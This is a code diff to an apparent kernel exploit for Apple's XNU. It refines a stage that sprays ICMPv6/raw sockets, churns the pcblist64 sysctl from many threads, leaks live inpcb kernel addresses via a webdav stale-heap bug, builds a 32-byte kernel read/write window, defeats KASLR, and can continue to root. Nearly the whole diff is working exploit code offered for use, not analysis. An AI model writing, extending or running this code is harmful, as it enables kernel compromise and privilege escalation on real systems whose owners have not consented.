@@ -2,11 +2,13 @@
  * krw.c -- stage-2 kernel R/W implementation (see krw.h for the primitive
  * chain) plus the `auto` driver that runs the whole stage:
  *
- *   spray inpcb table -> free old tables -> webdav stale-heap leak of the
- *   freed table (inpcb pointers) -> probe candidates with the confusion
- *   write to match addresses to our ICMPv6 sockets -> redirect A's
- *   in6p_icmp6filt at B's filter field -> 32-byte kernel R/W window ->
- *   compute KASLR slide via A.inp_pcbinfo (- _ripcbinfo).
+ *   spray ripcb sockets + open identity sockets (all kept open) -> churn
+ *   the net.inet.raw.pcblist64 sysctl (kernel kalloc_large arrays of raw
+ *   inpcb pointers, freed on return) -> webdav stale-heap leak recovers
+ *   those arrays (live inpcb addresses) -> probe candidates with the
+ *   confusion write to match addresses to our ICMPv6 sockets -> redirect
+ *   A's in6p_icmp6filt at B's filter field -> 32-byte kernel R/W window ->
+ *   runtime KASLR slide via A.inp_pcbinfo (validated on the ripcb list).
  *
  * With --root it continues into root_stage() (root.c).
  */
@@ -24,6 +26,7 @@
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <sys/resource.h>
+#include <sys/sysctl.h>
 #include <sys/types.h>
 #include <sys/wait.h>
 #include <netinet/in.h>
@@ -693,6 +696,74 @@ krw_close(krw_t *k)
 /* unique kernel-data-pointer qwords that could be inpcb addresses)    */
 /* ------------------------------------------------------------------ */
 
+/* ------------------------------------------------------------------ */
+/* pcblist churn: the net.inet.raw.pcblist64 sysctl kallocs an array   */
+/* of n raw inpcb pointers (64 KB with our ~8k ripcb sockets ->         */
+/* kalloc_large) and frees it on return.  Churning it from many threads */
+/* leaves a big hole in the kalloc_large map whose last contents are    */
+/* those arrays -- the webdav 19 MB kalloc_large buffer then reuses     */
+/* that VA range, so the stale-heap leak recovers LIVE inpcb addresses. */
+/* (rip_pcblist64 walks ripcbinfo, which includes our ICMPv6 dgram      */
+/* sockets; the copyout to userland is address-hashed but the kernel-   */
+/* side array holds raw pointers.)                                      */
+/* ------------------------------------------------------------------ */
+
+#define CHURN_THREADS   256
+#define CHURN_SECONDS   3
+
+static volatile int g_churn_stop;
+
+static void *
+churn_thread(void *arg)
+{
+    uint8_t buf[4096];  /* tiny user buffer: the kernel builds + frees its
+                         * inpcb-pointer array before SYSCTL_OUT runs out */
+    size_t len;
+    unsigned long iters = 0;
+
+    (void)arg;
+    while (!g_churn_stop) {
+        len = sizeof(buf);
+        (void)sysctlbyname("net.inet.raw.pcblist64", buf, &len, NULL, 0);
+        iters++;
+    }
+    return (void *)iters;
+}
+
+static int
+pcblist_churn_run(void)
+{
+    pthread_t th[CHURN_THREADS];
+    int i, n = 0;
+    unsigned long total = 0;
+
+    g_churn_stop = 0;
+    for (i = 0; i < CHURN_THREADS; i++) {
+        if (pthread_create(&th[i], NULL, churn_thread, NULL) == 0)
+            n++;
+    }
+    if (n == 0)
+        return -1;
+    fprintf(stderr, "[krw] pcblist churn: %d threads x %ds\n",
+            n, CHURN_SECONDS);
+    sleep(CHURN_SECONDS);
+    g_churn_stop = 1;
+    for (i = 0; i < n; i++) {
+        void *r = NULL;
+        pthread_join(th[i], &r);
+        total += (unsigned long)r;
+    }
+    fprintf(stderr, "[krw] churn done: %lu sysctl iterations\n", total);
+    return 0;
+}
+
+static int
+u64_cmp(const void *a, const void *b)
+{
+    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
+    return (x > y) - (x < y);
+}
+
 static void
 wdav_unmount(const char *mnt)
 {
@@ -749,18 +820,10 @@ wdav_leak_candidates(const char *server, const char *mnt,
 
     for (i = 0; i + 8 <= got; i += 8) {
         uint64_t v;
-        size_t j;
-        int seen;
         memcpy(&v, buf + i, 8);
-        /* inpcb zone element start: inside the zalloc GEN zone range and
-         * 0x400-aligned (INPCB_SIZE; elements pack exactly 16/page). */
-        if (v < ZONE_MAP_LO || v >= ZONE_MAP_HI || (v & 0x3ff) != 0)
-            continue;
-        seen = 0;
-        for (j = 0; j < ncand; j++) {
-            if (cand[j] == v) { seen = 1; break; }
-        }
-        if (seen)
+        /* inpcb pointers live in the zalloc GEN zone range and are
+         * 16-aligned (kalloc_type zone elements).  No size assumption. */
+        if (v < ZONE_MAP_LO || v >= ZONE_MAP_HI || (v & 0xf) != 0)
             continue;
         if (ncand == cap) {
             cap = cap ? cap * 2 : 4096;
@@ -771,7 +834,68 @@ wdav_leak_candidates(const char *server, const char *mnt,
         }
         cand[ncand++] = v;
     }
-    fprintf(stderr, "[krw] %zu unique zone-range candidates\n", ncand);
+    fprintf(stderr, "[krw] %zu zone-range qwords in leak\n", ncand);
+
+    /* inp_list signature: the stale pcblist arrays are runs of inpcb
+     * pointers separated by exactly the inpcb element stride.  Find the
+     * dominant stride between sorted consecutive distinct values and keep
+     * only qwords that belong to such a chain -- everything else is stale
+     * garbage that would panic the box if probed. */
+    if (ncand >= 32) {
+        uint64_t *deltas;
+        size_t nd = 0, ndel = 0, best_cnt = 0;
+        uint64_t best_delta = 0;
+        size_t a, kept = 0;
+
+        qsort(cand, ncand, sizeof(uint64_t), u64_cmp);
+        /* dedup in place */
+        for (a = 0; a < ncand; a++) {
+            if (nd == 0 || cand[a] != cand[nd - 1])
+                cand[nd++] = cand[a];
+        }
+        ncand = nd;
+        deltas = malloc((ncand - 1) * sizeof(uint64_t));
+        if (deltas == NULL)
+            goto out;
+        for (a = 1; a < ncand; a++) {
+            uint64_t d = cand[a] - cand[a - 1];
+            if (d >= 0x100 && d <= 0x800)   /* plausible inpcb stride */
+                deltas[ndel++] = d;
+        }
+        if (ndel >= 32) {
+            qsort(deltas, ndel, sizeof(uint64_t), u64_cmp);
+            for (a = 0; a < ndel; ) {
+                size_t b = a + 1;
+                while (b < ndel && deltas[b] == deltas[a])
+                    b++;
+                if (b - a > best_cnt) {
+                    best_cnt = b - a;
+                    best_delta = deltas[a];
+                }
+                a = b;
+            }
+        }
+        free(deltas);
+        fprintf(stderr, "[krw] dominant inpcb stride: 0x%llx "
+                "(%zu consecutive pairs)\n",
+                (unsigned long long)best_delta, best_cnt);
+        if (best_delta == 0 || best_cnt < 32) {
+            fprintf(stderr, "[krw] no inp_list array signature in leak\n");
+            goto out;
+        }
+        for (a = 0; a < ncand; a++) {
+            int in_chain =
+                (a > 0 && cand[a] - cand[a - 1] == best_delta) ||
+                (a + 1 < ncand && cand[a + 1] - cand[a] == best_delta);
+            if (in_chain)
+                cand[kept++] = cand[a];
+        }
+        fprintf(stderr, "[krw] stride-chain filter: %zu -> %zu "
+                "candidates\n", ncand, kept);
+        ncand = kept;
+        if (ncand == 0)
+            goto out;
+    }
 
     /* Clustering filter: inpcb zone elements cluster tightly, so drop
      * outliers far from the median.  Probing an unmapped candidate faults
@@ -911,6 +1035,7 @@ main(int argc, char **argv)
     krw_t *k = NULL;
     uint64_t *cand = NULL;
     size_t ncand = 0;
+    inpcb_spray_t *sp = NULL;
 
     if (argc < 2 || strcmp(argv[1], "auto") != 0) {
         usage(argv[0]);
@@ -955,39 +1080,39 @@ main(int argc, char **argv)
     if (k == NULL)
         return 1;
 
-    /* 2+3. spray -> destroy -> identity -> stale-heap leak, with a quality
-     *    gate: the identity set is opened AFTER the spray table is freed so
-     *    its inpcbs recycle freed table slots -- the leaked stale table then
-     *    points at our LIVE sockets.  Only probe when the leaked buffer
-     *    really looks like the freed inpcb table (most candidates inside one
-     *    tight 16 MB window).  Probing garbage candidates makes the kext
-     *    dereference unmapped memory = panic. */
+    /* 2. socket set, ALL kept open for the whole stage (the leaked inpcb
+     *    addresses must still be live when probed):
+     *    - spray sockets inflate ripcbinfo so the pcblist sysctl's
+     *      inpcb-pointer array is kalloc_large-sized (64 KB @ 8k pcbs);
+     *    - identity sockets (hops 0x41) are the ones the confusion probe
+     *      matches leaked addresses against. */
+    sp = inpcb_spray_start(spray_n);
+    if (sp == NULL) {
+        fprintf(stderr, "[krw] spray failed\n");
+        goto out;
+    }
+    fprintf(stderr, "[krw] sprayed %d sockets (kept open)\n",
+            inpcb_spray_count(sp));
+    if (krw_identity_open(k, ident) < 2) {
+        fprintf(stderr, "[krw] need at least 2 identity sockets\n");
+        goto out;
+    }
+
+    /* 3. pcblist churn + webdav stale-heap leak, quality-gated: only probe
+     *    when the leaked buffer contains the inp_list array signature
+     *    (a dominant constant stride between GEN-range pointers). */
     {
         int attempt;
         int good = 0;
 
         for (attempt = 0; attempt < 6 && !good; attempt++) {
-            inpcb_spray_t *sp;
-
             if (attempt > 0)
-                fprintf(stderr, "[krw] retrying spray+leak "
+                fprintf(stderr, "[krw] retrying churn+leak "
                         "(attempt %d/6)\n", attempt + 1);
 
-            if (k->nfds)
-                krw_identity_close(k);
-
-            sp = inpcb_spray_start(spray_n);
-            if (sp == NULL) {
-                fprintf(stderr, "[krw] spray failed\n");
-                goto out;
-            }
-            fprintf(stderr, "[krw] sprayed %d sockets, freeing\n",
-                    inpcb_spray_count(sp));
-            inpcb_spray_destroy(sp);
-
-            if (krw_identity_open(k, ident) < 2) {
-                fprintf(stderr, "[krw] need at least 2 identity sockets\n");
-                goto out;
+            if (pcblist_churn_run() != 0) {
+                fprintf(stderr, "[krw] churn failed\n");
+                continue;
             }
 
             free(cand);
@@ -1069,6 +1194,8 @@ main(int argc, char **argv)
 
 out:
     free(cand);
+    if (sp != NULL)
+        inpcb_spray_destroy(sp);
     krw_close(k);
     return rc;
 }
